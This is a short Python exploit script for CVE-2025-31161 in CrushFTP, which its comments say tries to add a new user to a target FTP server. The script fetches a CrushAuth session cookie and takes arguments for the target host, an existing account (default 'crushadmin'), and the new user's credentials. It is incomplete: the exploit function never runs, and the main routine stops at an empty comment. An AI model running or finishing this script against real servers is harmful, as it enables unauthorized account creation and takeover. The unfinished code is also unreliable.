#https://github.com/NeonPotatoChips/CVEs/tree/main/CVE-2025-31161
#CVE-2025-31161 affects certain versions of CrushFTP
#Attempts to add a new user to ftp server

#imports
import requests
import argparse

#colors
RED = "\033[0;31m"
GREEN = "\033[0;32m"
RESET = "\033[0m"

def send_exploit(host, port, tuser, nuser, npass):
    #get valid cookie to use for authentication
    print(f"    {GREEN}[.]{RESET} Getting valid cookie for authentication")

    try:
        response = requests.get(f"http://{host}:{port}/WebInterface/function")

        if response.status_code == 200:
            authcookie = response.cookies.get("CrushAuth")
            print(f"    {GREEN}[.]Cookie obtained: {authcookie}")
    except requests.exceptions.ConnectionError:
        print(f"    {RED}[x] There has been an error connecting to {host}")



#main
def main():
    #create parser
    parser = argparse.ArgumentParser(description="POC for CVE-2025-31161")
    parser.add_argument("-host", help="Target url")
    parser.add_argument("-port", help="Target port", default=80)
    parser.add_argument("-tuser", help="Existing user to use for exploit", default="crushadmin")
    parser.add_argument("-nuser", help="User to be created", default="testUser")
    parser.add_argument("-npass", help="Password for new user", default="password123!")
    args = parser.parse_args()

    if not args.host:
        print(f"    {RED}[x]{RESET}: Please enter a target host. Ex: testurl.com")
        exit(1)

    #

if __name__ == "__main__":
    main()